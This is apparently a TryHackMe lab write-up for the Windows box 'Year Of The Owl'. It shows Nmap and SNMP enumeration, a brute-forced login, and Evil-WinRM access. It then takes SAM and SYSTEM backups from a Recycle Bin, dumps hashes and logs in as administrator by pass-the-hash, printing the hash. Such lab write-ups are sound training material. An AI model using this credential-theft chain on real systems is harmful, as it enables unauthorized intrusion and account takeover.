# TryHackMe
------------------------------------
### IP: 10.10.97.171
### Name: Year Of The Owl
### Difficulty: Hard
--------------------------------------------


![yoto.png](../assets/year_of_the_owl_assets/yoto.png)

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the --min-rate 10000 flag to speed things up. I'll also use the -sC and -sV to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Year_Of_The_Owl]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.10.174.131
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-13 14:11 CDT
Nmap scan report for 10.10.174.131
Host is up (0.14s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: Year of the Owl
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-10-6-72-91.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-13T19:12:14+00:00
| ssl-cert: Subject: commonName=year-of-the-owl
| Not valid before: 2024-06-12T18:44:02
|_Not valid after:  2024-12-12T18:44:02
|_ssl-date: 2024-06-13T19:12:56+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=6/13%Time=666B447F%P=aarch64-unknown-linux-gn
SF:u%r(NULL,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-6-72-91\.eu-west-1\.compu
SF:te\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x2
SF:0MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-13T19:12:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.10 seconds
```

Cool, looks like we've got a Windows box here.

Looking at port 80 we find a page with a pucture of an owl:

yoto_site.png

After quite awhile enumerating and not finding anything of interest, I turned to UDP, and keyed in on SNMP:

```
┌──(ryan㉿kali)-[~/THM/Year_Of_The_Owl]
└─$ sudo nmap -sU -p 161 10.10.174.131 

Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-13 14:18 CDT
Nmap scan report for 10.10.174.131
Host is up (0.14s latency).

PORT    STATE         SERVICE
161/udp open|filtered snmp

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
```
Scanning for community strings we find:

```
┌──(ryan㉿kali)-[~/THM/Year_Of_The_Owl]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.174.131
Scanning 1 hosts, 3219 communities
10.10.174.131 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

We can now use snmpwalk to begin enumerating:
```
┌──(ryan㉿kali)-[~/THM/Year_Of_The_Owl]
└─$ snmpwalk -v2c -c openview 10.10.174.131
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.2
iso.3.6.1.2.1.1.3.0 = Timeticks: (245024) 0:40:50.24
iso.3.6.1.2.1.1.4.0 = ""
iso.3.6.1.2.1.1.5.0 = STRING: "year-of-the-owl"
```

Not finding anything of interest (or maybe just missing it) I tried using snmp-check against the disovered community string, and this timme found a username:

yoto_udp.png

I tried using Hydra to bruteforce RDP, and got an interesting result:

yoto_hydra1.png

Looks like this may be a valid password, but jareth doesn't have an account with RDP.

I can confirm the credential works to read SMB shares:

yoto_shares_jareth.png

And I can login using Evil-Winrm:

```
┌──(ryan㉿kali)-[~/THM/Year_Of_The_Owl]
└─$ evil-winrm -u jareth -p sarah -i 10.10.174.131


Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
year-of-the-owl\jareth
*Evil-WinRM* PS C:\Users\Jareth\Documents> hostname
year-of-the-owl
```

We can grab the user.txt flag:

yoto_user_flag.png

### Privilege Escalation

I got stuck here for ages, and had to take a peek at a writeup. On one hand this privilege escalation vector was a bit disapointing, but on the other hand it taught me something totally new, which is awesome.

Apparently the trick here was to check inside user Jareth's Recycle Bin, and inside we discover backups of SAM and SYSTEM.

So to do this first we'll need Jareth's SID, which we can get with `whoami /all`:

```
*Evil-WinRM* PS C:\users\jareth\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
```

We can then search inside the Recycle Bin with:

`cd 'C:\$Recycle.bin\<SID>`


```
*Evil-WinRM* PS C:\users\jareth\Desktop> cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> ls


    Directory: C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

Okey dokey, lets bring these back locally with evil-winrm's Download feature and dump some hashes.

But before we do that we'll need to copy these files out of the Recycle Bin first:

```
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy sam.bak C:\temp
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy system.bak C:\temp
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cd C:\temp
```

Once you have the files locally we can use impacket-secretsdump to extract the hashes:

yoto_secrets.png

Nice, lets pass-the-hash and login with the administrator's password:

```
┌──(ryan㉿kali)-[~/THM/Year_Of_The_Owl]
└─$ evil-winrm -u administrator -i 10.10.174.131 -H 6bc99ede9edcfecf9662fb0c0ddcfa7a



Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
year-of-the-owl\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
year-of-the-owl
```

Nice, now lets grab that final flag:

yoto_root_flag.png

Thanks for following along!

-Ryan

-------------------------------------------------
